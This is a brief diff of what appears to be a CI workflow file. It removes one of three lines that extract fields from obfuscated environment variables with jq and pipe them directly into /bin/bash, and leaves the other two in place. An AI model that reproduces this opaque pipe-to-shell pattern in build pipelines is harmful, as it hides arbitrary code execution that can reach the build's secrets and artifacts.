@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
           echo $do4603 | jq -r .pd4302 | /bin/bash
-          echo $ltuql3496 | jq -r .gde6 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
